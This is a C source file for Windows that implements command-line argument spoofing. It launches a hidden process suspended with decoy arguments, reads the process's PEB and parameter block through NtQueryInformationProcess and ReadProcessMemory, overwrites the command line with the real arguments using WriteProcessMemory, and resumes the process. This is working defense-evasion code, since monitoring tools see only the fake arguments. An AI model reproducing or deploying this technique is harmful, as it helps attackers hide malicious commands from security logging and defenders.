#include"func.h"

typedef NTSTATUS(WINAPI* MyAPI)(
	HANDLE           ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID            ProcessInformation,
	ULONG            ProcessInformationLength,
	PULONG           ReturnLength
	);



BOOL ReadfromTargetProcess(IN HANDLE hProcess, IN PVOID pAdress, OUT PVOID* pBuffer, IN DWORD dwBufSize) {


	SIZE_T NmbreOfByteRead = NULL;
   
	*pBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufSize);

	if (!ReadProcessMemory(hProcess, pAdress, *pBuffer, dwBufSize, &NmbreOfByteRead)|| NmbreOfByteRead != dwBufSize)  {

		printf("[-] Error On Reading Process infos , error code : %lu \n  ", GetLastError());
		return FALSE;
	}
	printf("[+] Reading Succesfuly \n ");
	return TRUE;
}

BOOL WriteToTargProcess(IN HANDLE hProcess, IN PVOID PaddressToWrite, IN PVOID pBuffer, IN DWORD dwBufSize) {

	SIZE_T sNmbrOfWritten = NULL;

	if (!WriteProcessMemory(hProcess, PaddressToWrite, pBuffer, dwBufSize, &sNmbrOfWritten)) {

		printf("[-] Error On Writing Process infos , error code : %lu \n  ", GetLastError());
		return FALSE;
	}
	printf("[+] Written Succesfully \n ");
	return TRUE;
}

BOOL CreateSpoofedProcess(IN LPWSTR AppName ,IN LPWSTR FakeArgs, IN LPWSTR RealArgs,OUT DWORD* ProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

	NTSTATUS Verificator = NULL;
	WCHAR szProcess[MAX_PATH];

	// our legend struct 

	STARTUPINFOW Si = { 0 };
	PROCESS_INFORMATION Pi = { 0 };
	PROCESS_BASIC_INFORMATION PBI = { 0 };
	ULONG uRetern = NULL;
	PPEB pPEB = NULL;
	PRTL_USER_PROCESS_PARAMETERS pParmtr = NULL;

	// initialiser Wch kayen fama 
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOW));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
	Si.cb = sizeof(STARTUPINFOW);


	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	MyAPI fnNtQueryInformationProcess = (MyAPI)GetProcAddress(hNtdll, "NtQueryInformationProcess");
		if (fnNtQueryInformationProcess == NULL){
			return FALSE;
		}

	lstrcpyW(szProcess, FakeArgs);

	if (!CreateProcessW(
		AppName,
		szProcess,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED | CREATE_NO_WINDOW,
		NULL,
		L"C:\\Windows\\System32\\",
		&Si,
		&Pi)) {
		printf("\t[!] CreateProcessA Failed with Error : %d \n",
			GetLastError());
		return FALSE;
	}
		if ((Verificator = fnNtQueryInformationProcess(Pi.hProcess,ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION),&uRetern)) != 0) {
			printf("\t[!] NtQueryInformationProcess Failed With Error :0x % 0.8X \n", Verificator);
				return FALSE;
		}
	
		if (!ReadfromTargetProcess(Pi.hProcess, PBI.PebBaseAddress, &pPEB,sizeof(PEB))) {
			printf("\t[!] Failed To Read Target's Process Peb \n");
			return FALSE;
		}
	// Reading the RTL_USER_PROCESS_PARAMETERS structure from the PEB

		if (!ReadfromTargetProcess(Pi.hProcess, pPEB->ProcessParameters,&pParmtr, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF)) {
			printf("\t[!] Failed To Read Target's Process ProcessParameters \n");
				return FALSE;
		}
	// Writing the real argument to the process
	if (!WriteToTargProcess(Pi.hProcess, (PVOID)pParmtr -> CommandLine.Buffer, (PVOID)RealArgs, (DWORD)(lstrlenW(RealArgs) *sizeof(WCHAR) + 1))) {
		printf("\t[!] Failed To Write The Real Parameters\n");
		return FALSE;
	}
	
	HeapFree(GetProcessHeap(), NULL, pPEB);
	HeapFree(GetProcessHeap(), NULL, pParmtr);

	// 9ala3 takhdem 
	ResumeThread(Pi.hThread);

	
	*ProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;
	// Checking if everything is valid
	if (*ProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;
	return FALSE;
}